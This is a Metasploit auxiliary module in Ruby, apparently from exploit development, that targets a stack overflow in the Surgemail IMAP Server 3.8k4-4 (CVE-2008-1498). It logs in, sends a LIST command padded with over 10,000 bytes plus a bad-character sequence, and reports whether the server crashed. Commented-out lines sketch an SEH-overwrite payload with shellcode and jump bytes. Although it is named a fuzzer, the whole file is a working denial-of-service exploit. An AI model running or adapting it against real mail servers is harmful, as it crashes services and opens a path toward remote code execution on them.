
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
	include Msf::Exploit::Remote::Imap
	include Msf::Auxiliary::Dos

	def initialize
		super(
			'Name'		=> 'Simple IMAP Fuzzer',
			'Description'   => %q{
				This module exploits a stack overflow in the Surgemail
			       	IMAP Server version 3.8k4-4 by sending an overly long
				LIST command. Valid IMAP account credentials are required.
			},
			'Author'	=> [ 'ryujin' ],
			'License'	=> MSF_LICENSE,
			'Version'	=> '$Revision: 1$',
			'References'	=> [
				[ 'BID', '28260' ],	
				[ 'CVE', '2008-1498' ],
				[ 'URL', 'http://www.exploit-db.com/exploits/5259' ],
			]
		)
	end

	#def check
	#	connect 
	#	disconnect
	#	if (banner and banner =! /(Version 3.8k4-4)/)
	#		return Exploit::CheckCode::Vulnerable
	#	end
	#	return Exploit::CheckCode::Safe
	#end

	def fuzz_str()
		return Rex::Text.rand_text_alphanumeric(rand(1024))
	end

	def run 
		connected = connect_login()

		lead = "\x41" * (10360)

		evil = lead + "\x43" * 4
		evil =  evil + "\x01\x02\x03\x04\x05\x06\x07\x08"\
		     +  "\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"\
		     +  "\x91\x92\x93\x94\x95\x96\x97\x98"\
		     +  "\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"\
		     +  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"\
		     +  "\xa9\xaa\xab\xac\xad\xae\xaf\xb0"\
		     +  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8"\
		     +  "\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"\
		     +  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8"\
		     +  "\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"\
		     +  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8"\
		     +  "\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"\
		     +  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8"\
		     +  "\xe9\xea\xeb\xec\xed\xee\xef\xf0"\
		     +  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8"\
		     +  "\xf9\xfa\xfb\xfc\xfd\xfe\xff"
		#evil = lead + [target.ret].pack("A3")
		
		#lead = "\x41" * 10356
		#nseh = "\xeb\xf9\x90\x90"
		#evil = lead + [target.ret].pack("A3")
		
		
		#lead = "\x90" * (10351 - payload.encoded.length)
		#near = "\xe9\xdd\xd7\xff\xff"
		#nseh = "\xeb\xf9\x90\x90"
		#evil = lead + payload.encoded + near + nseh + [target.ret].pack("A3")

		print_status("Sending payload")
		req = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
		print_status(req)
		res = raw_send_recv(req)

		if !res.nil?
			print_status(res)
		else
			print_status("Server crashed, no response")
		end
		disconnect()
	end
end
